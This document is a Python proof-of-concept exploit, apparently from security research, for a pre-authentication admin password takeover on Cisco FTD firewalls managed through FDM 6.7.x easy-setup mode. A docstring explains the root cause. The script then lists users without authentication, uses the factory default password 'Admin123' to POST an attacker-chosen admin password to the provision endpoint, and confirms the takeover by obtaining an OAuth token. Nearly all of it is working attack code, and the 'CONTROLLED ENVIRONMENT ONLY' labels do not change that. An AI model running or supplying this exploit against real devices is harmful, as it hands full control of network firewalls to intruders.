"""
F-FTD-60: FDM Easy Setup Pre-Auth Admin Password Takeover (CRITICAL)
CONTROLLED ENVIRONMENT ONLY

Root cause:
  NgfwEasysetupDoneFilter exempts /devices/default/action/provision from auth
  when /etc/sf/easySetupDone.txt does not exist (factory-fresh / factory-reset).

  InitialProvisionHandler.createEntity() bytecode:
    acceptEula(serviceParam)
    changePassword(provision, serviceParam)   ← sets admin password (no auth check)
    enableEvaluationMode(serviceParam)
    finishEasySetup(serviceParam)            ← creates /etc/sf/easySetupDone.txt

  changePassword() runs when EZSetupService.isPasswordNotChanged() == true,
  which is true on any factory-fresh or factory-reset FTD device.

Attack conditions:
  1. FTD management interface reachable on port 443
  2. /etc/sf/easySetupDone.txt absent (factory-fresh or after 'configure factory-default')
  3. FDM 6.7.x (API base /api/fdm/v6/)

API path: POST /api/fdm/v6/devices/default/action/provision
Model: InitialProvision {
    acceptEULA: bool
    currentPassword: EncryptedString   <- factory default: "Admin123"
    newPassword: EncryptedString       <- attacker-chosen
}

File-based filter: easySetupDone.file=/etc/sf/easySetupDone.txt
  Source: common.jar META-INF/application-production.properties line 73

Verified via:
  NgfwEasysetupDoneFilter.class bytecode (doFilter: isFesUrl -> allow)
  InitialProvisionHandler.class bytecode (createEntity -> changePassword -> finishEasySetup)
  easysetup-urls.json (/devices/default/action/provision: ["POST","GET"])
"""

# CONTROLLED ENVIRONMENT ONLY

import requests
import sys
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# FTD 6.7 FDM API base
FDM_API_BASE = "/api/fdm/v6"
PROVISION_PATH = f"{FDM_API_BASE}/devices/default/action/provision"
TOKEN_PATH = f"{FDM_API_BASE}/fdm/token"

# Factory default admin password for FTD FDM
FTD_FACTORY_DEFAULT_PASSWORD = "Admin123"


def check_easy_setup_mode(host, port=443):
    """Check if FDM is in easy setup mode via unauthenticated GET."""
    url = f"https://{host}:{port}{FDM_API_BASE}/operational/systeminfo/default"
    try:
        r = requests.get(url, verify=False, timeout=10)
        if r.status_code == 200:
            info = r.json()
            print(f"[+] Device in easy setup mode — unauthenticated /systeminfo accessible")
            print(f"    Model: {info.get('model', '?')}")
            print(f"    Hostname: {info.get('hostname', '?')}")
            print(f"    Software: {info.get('softwareVersion', '?')}")
            return True
        elif r.status_code == 401:
            print(f"[-] Device NOT in easy setup mode — /systeminfo requires auth (setup completed)")
            return False
        elif r.status_code == 403:
            print(f"[-] Device NOT in easy setup mode — easySetupDone.txt exists, filter blocking")
            return False
        else:
            print(f"[?] Unexpected status {r.status_code} — check connectivity")
            return False
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection failed: {e}")
        return False


def check_users_unauthenticated(host, port=443):
    """List users via unauthenticated GET /object/users (easy setup bypass)."""
    url = f"https://{host}:{port}{FDM_API_BASE}/object/users"
    try:
        r = requests.get(url, verify=False, timeout=10)
        if r.status_code == 200:
            data = r.json()
            items = data.get('items', [])
            print(f"[+] Unauthenticated user enumeration: {len(items)} users")
            for u in items:
                print(f"    UUID: {u.get('id', '?')} | Name: {u.get('name', '?')} | ServiceType: {u.get('userServciceType', u.get('userServiceType', '?'))}")
            return items
        else:
            print(f"[-] User enumeration failed: {r.status_code}")
            return []
    except Exception as e:
        print(f"[-] Error: {e}")
        return []


def fetch_eula_text(host, port=443):
    """
    GET /devices/default/eula/default (unauthenticated during easy setup).
    Returns the EULA text required in the provision POST body.

    InitialProvisionValidator.isEULACorrect() compares request eulaText
    against EULARepository.readEulaText() — must match (trimmed).
    """
    url = f"https://{host}:{port}{FDM_API_BASE}/devices/default/eula/default"
    try:
        r = requests.get(url, verify=False, timeout=10)
        if r.status_code == 200:
            data = r.json()
            eula_text = data.get('eulaText', '')
            print(f"[+] EULA text fetched: {len(eula_text)} chars")
            return eula_text
        else:
            print(f"[-] EULA fetch failed: {r.status_code} — will attempt provision without eulaText")
            return None
    except Exception as e:
        print(f"[-] EULA fetch error: {e} — will attempt provision without eulaText")
        return None


def exploit_provision(host, new_password, current_password=None, port=443):
    """
    POST unauthenticated to /devices/default/action/provision.
    Sets admin password + completes setup (closes easy setup window).

    InitialProvisionValidator requires:
      - acceptEULA=true
      - eulaText matching GET /devices/default/eula/default response
      - currentPassword and newPassword non-null

    CONTROLLED ENVIRONMENT ONLY
    """
    if current_password is None:
        current_password = FTD_FACTORY_DEFAULT_PASSWORD

    # Fetch EULA text — required by InitialProvisionValidator.isEULACorrect()
    eula_text = fetch_eula_text(host, port)

    url = f"https://{host}:{port}{PROVISION_PATH}"

    body = {
        "acceptEULA": True,
        "currentPassword": {
            "encryptedString": current_password
        },
        "newPassword": {
            "encryptedString": new_password
        },
        "type": "initialprovision"
    }
    if eula_text is not None:
        body["eulaText"] = eula_text

    print(f"\n[*] Sending unauthenticated POST to {url}")
    print(f"    currentPassword: {current_password}")
    print(f"    newPassword: {new_password}")

    try:
        r = requests.post(
            url,
            json=body,
            verify=False,
            timeout=30,
            headers={"Content-Type": "application/json"}
        )
        print(f"\n[*] Response: {r.status_code}")
        if r.status_code in (200, 201):
            print(f"[!] SUCCESS — admin password set to: {new_password}")
            print(f"    Easy setup completed — /etc/sf/easySetupDone.txt created")
            print(f"    Verify: authenticate to FDM with admin:{new_password}")
            return True
        elif r.status_code == 403:
            print(f"[-] 403 — easy setup already done (device was configured) OR wrong password")
            print(f"    Body: {r.text[:300]}")
            return False
        elif r.status_code == 400:
            print(f"[-] 400 — bad request (check currentPassword value)")
            print(f"    Body: {r.text[:300]}")
            return False
        else:
            print(f"[-] Unexpected status {r.status_code}")
            print(f"    Body: {r.text[:300]}")
            return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def verify_new_credentials(host, new_password, port=443):
    """Verify the new admin password works by obtaining an OAuth token."""
    url = f"https://{host}:{port}{TOKEN_PATH}"
    body = {
        "grant_type": "password",
        "username": "admin",
        "password": new_password
    }
    try:
        r = requests.post(url, json=body, verify=False, timeout=15)
        if r.status_code == 200:
            data = r.json()
            token = data.get('access_token', '')[:40]
            print(f"[!] VERIFIED — admin:{new_password} authenticated successfully")
            print(f"    Access token: {token}...")
            return True
        else:
            print(f"[-] Auth verification failed: {r.status_code} — {r.text[:200]}")
            return False
    except Exception as e:
        print(f"[-] Verification error: {e}")
        return False


if __name__ == '__main__':
    print("=" * 70)
    print("F-FTD-60: FDM Easy Setup Pre-Auth Admin Takeover — CONTROLLED ENV ONLY")
    print("=" * 70)

    if len(sys.argv) < 3:
        print(f"\nUsage: {sys.argv[0]} <fdm-host> <new-admin-password> [current-password]")
        print(f"  fdm-host: FTD management IP (FDM HTTPS on port 443)")
        print(f"  new-admin-password: password to set for admin account")
        print(f"  current-password: factory default (default: {FTD_FACTORY_DEFAULT_PASSWORD})")
        print(f"\nAttack requires device in easy setup mode (factory-fresh or factory-reset).")
        print(f"Attack window closes after setup completion (finishEasySetup creates done-marker).")
        sys.exit(1)

    host = sys.argv[1]
    new_password = sys.argv[2]
    current_password = sys.argv[3] if len(sys.argv) > 3 else None

    print(f"\n[*] Target: {host}:443 (FDM)")

    # Phase 1: Confirm easy setup mode
    print("\n--- Phase 1: Check easy setup mode ---")
    in_setup = check_easy_setup_mode(host)
    if not in_setup:
        print("\n[!] Device not in easy setup mode. Exiting.")
        sys.exit(1)

    # Phase 2: Enumerate users (confirms bypass is active)
    print("\n--- Phase 2: Enumerate users (unauthenticated) ---")
    check_users_unauthenticated(host)

    # Phase 3: Set admin password
    print("\n--- Phase 3: Exploit — set admin password ---")
    success = exploit_provision(host, new_password, current_password)

    # Phase 4: Verify
    if success:
        print("\n--- Phase 4: Verify new credentials ---")
        verify_new_credentials(host, new_password)

    print("\n[*] Done. CONTROLLED ENVIRONMENT ONLY.")
